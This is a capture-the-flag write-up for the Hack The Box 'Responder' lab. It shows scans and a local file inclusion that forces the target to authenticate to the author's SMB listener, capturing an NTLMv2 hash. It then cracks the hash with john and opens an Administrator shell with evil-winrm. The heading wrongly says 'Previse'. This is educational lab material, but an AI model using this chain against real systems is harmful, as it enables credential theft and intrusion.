---
title: Responder
description: A write up for the ResponderResponder[EASY] challenge
published: false
datePublished: 1610805690979
author: lwlx
authorTwitter: "0x0000005"
authorPhoto: /profile.jpg
tags:
  - ctf
  - writeup
  - hackthebox
  - Responder
  - htb
  - security
thumbnailPhoto: /hackerone/hackerone.png
bannerPhoto: /hackerone/hackerone.png
canonicalUrl:
---

# Previse _[EASY]_

This is my Write Up for the "Responder" challenge from Hack The Box.

We are given a ip 10.129.55.164

## Enumeration

#### nmap:
``` lwlx@lwlxs-MacBook-Pro myOSWE % sudo nmap -sS 10.129.55.164
Password:
Starting Nmap 7.92 ( https://nmap.org ) at 2022-04-08 01:30 CEST
Nmap scan report for 10.129.55.164
Host is up (0.052s latency).
Not shown: 999 filtered tcp ports (no-response)
PORT   STATE SERVICE
80/tcp open  http````

```lwlx@lwlxs-MacBook-Pro myOSWE % sudo nmap -sS -p- -T5 10.129.55.164
Starting Nmap 7.92 ( https://nmap.org ) at 2022-04-08 01:33 CEST
Stats: 0:01:10 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 17.00% done; ETC: 01:40 (0:05:42 remaining)
Stats: 0:02:29 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 41.77% done; ETC: 01:39 (0:03:28 remaining)
Nmap scan report for 10.129.55.164
Host is up (0.11s latency).
Not shown: 65532 filtered tcp ports (no-response)
PORT     STATE SERVICE
80/tcp   open  http
5985/tcp open  wsman
7680/tcp open  pando-pub

Nmap done: 1 IP address (1 host up) scanned in 324.89 seconds
````

We found three open ports with services running on them, lets go thorugh them.

lets use nc first on port 80
````
lwlx@lwlxs-MacBook-Pro myOSWE % nc -v 10.129.55.164 80 
Connection to 10.129.55.164 port 80 [tcp/http] succeeded!
hi
HTTP/1.1 400 Bad Request
Date: Thu, 07 Apr 2022 23:43:44 GMT
Server: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.1
Content-Length: 325
Connection: close
Content-Type: text/html; charset=iso-8859-1

<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>400 Bad Request</title>
</head><body>
<h1>Bad Request</h1>
<p>Your browser sent a request that this server could not understand.<br />
</p>
<hr>
<address>Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.1 Server at unika.htb Port 80</address>
</body></html>
````
> Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.1

So we see there is a webservice running on port 80 which means there is a website, lets try and visit it.

it seems we get redirected to a domain name called unika.htb. this is typical, the redirect dos not work yet because our DNS does not know how to resolve it. to fix this we add it to our hosts file.

we find a basic website, the language switch seems to be vulnerable to local file inclusion.

we can proof this for example by including the current httpd.conf file for the server.
````
# # This is the main Apache HTTP server configuration file. It contains the # configuration directives that give the server its instructions. # See for detailed information. # In particular, see # # for a discussion of each configuration directive. # # Do NOT simply read the instructions in here without understanding # what they do. They're here only as hints or reminders. If you are unsure # consult the online docs. You have been warned. ........   ......... RandomSeed connect builtin # XAMPP: We disable operating system specific optimizations for a listening # socket by the http protocol here. IE 64 bit make problems without this. AcceptFilter http none AcceptFilter https none # AJP13 Proxy Include "conf/extra/httpd-ajp.conf"
```
before diving deeper here however i want to check out the other services running, since i for one havent heard of them yet.

using the responder utillity and the local file inclusion vulnerability i was able to get a username and a HTLM hash:

/index.php?page=10.10.14.81/o

[SMB] NTLMv2-SSP Client   : ::ffff:10.129.47.47
[SMB] NTLMv2-SSP Username : RESPONDER\Administrator
[SMB] NTLMv2-SSP Hash     : Administrator::RESPONDER:ded15dabbee2f8d1:55C41DBE760B574DB7D51C6AA4B15141:0101000000000000807DE95B2851D80104CCB82C797198E90000000002000800320044004E00330001001E00570049004E002D00440034005A004600590033004D0034004F005900430004003400570049004E002D00440034005A004600590033004D0034004F00590043002E00320044004E0033002E004C004F00430041004C0003001400320044004E0033002E004C004F00430041004C0005001400320044004E0033002E004C004F00430041004C0007000800807DE95B2851D80106000400020000000800300030000000000000000100000000200000EA593445609530A34F6BDB47317D0B435D44EF9ECF807834F94D83AA54DBAA790A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E00380031000000000000000000 


lets try and crack this with john

└─$ john -wordlist=/usr/share/wordlists/rockyou.txt hash.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
badminton        (Administrator)     
1g 0:00:00:00 DONE (2022-04-16 00:30) 100.0g/s 409600p/s 409600c/s 409600C/s 123456..oooooo
Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
Session completed.

´badminton´


lets use evil-winrm to try and connect

evil-winrm -i 10.129.47.47 -u administrator -p badminton

Evil-WinRM shell v3.3

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine                                                               

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion               

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\Administrator\Documents>

nice we got a connection lets loook for the final flag

```
Directory: C:\users\mike\desktop


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----         3/10/2022   4:50 AM             32 flag.txt


*Evil-WinRM* PS C:\Users\Administrator\Documents>  type /users/mike/desktop/flag.txt
ea81b7afddd03efaa0945333ed147fac```
